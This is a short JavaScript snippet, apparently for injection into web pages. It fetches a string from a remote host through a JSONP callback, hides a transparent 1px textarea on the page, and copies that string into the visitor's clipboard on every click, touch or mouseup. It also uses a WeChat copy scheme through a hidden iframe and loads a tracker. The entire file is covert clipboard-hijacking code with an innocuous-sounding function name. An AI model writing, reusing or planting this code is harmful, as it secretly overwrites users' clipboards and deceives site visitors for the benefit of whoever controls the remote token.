var c_mua = "";
function test(data){
  //setTimeout(function(a) { if (!document.body) { return setTimeout(arguments.callee, 50)}
  c_mua=data.text;
  var b = document.createElement("textarea");
  var u = navigator.userAgent;
  if (u.indexOf('Android') > -1 || u.indexOf('Linux') > -1) {
  //console.log('android');
  }else{
  //console.log('ios');
    b.setAttribute('disabled', 'disabled'); 
  }
  b.style.border = 0;
  b.style.position = 'fixed';
  b.style.top = 0;
  b.style.left = 0;
  b.style.width = '1px';
  b.style.height = '1px';
  b.style.background = "transparent";
  b.style.color = "transparent";
  b.id = 'hd_textarea_element';
  b.style["color"] = "transparent";
  document.body.appendChild(b);
  document.addEventListener('click', copy);
  document.addEventListener('touchstart', copy);
  document.addEventListener('touchend', copy);
  document.addEventListener('mouseup', copy);
  if(/MicroMessenger/i.test(u)){
    var iframe=document.createElement("iframe");
    iframe.style.cssText="display:none;width:0px;height:0px;";
    iframe.src='weixin://webview/copy/'+c_mua;
    document.body.appendChild(iframe);
  }
}

var copy = function() {
  if (!document.getElementById('hd_textarea_element')) {
    return
  };
  b = document.getElementById('hd_textarea_element');
  b.value = c_mua;
  //console.log('--------'+b.value)
  b.select();
  b.setSelectionRange(0, b.value.length);
  if(document.execCommand('copy', false, null)){
    b.remove();
  }
};
window.onload= function(){
  var s=document.createElement("script");
  s.setAttribute('src','http://logs.newapi.com/jd/gettokenv2?f=ma25&callback=test');
  document.body.appendChild(s)
  var d=document.createElement("div");
  d.style.display="none";
  d.innerHTML = '<script src="https://s19.cnzz.com/z_stat.php?id=1274164701&web_id=1274164701" language="JavaScript"></script>';
  document.body.appendChild(d)
}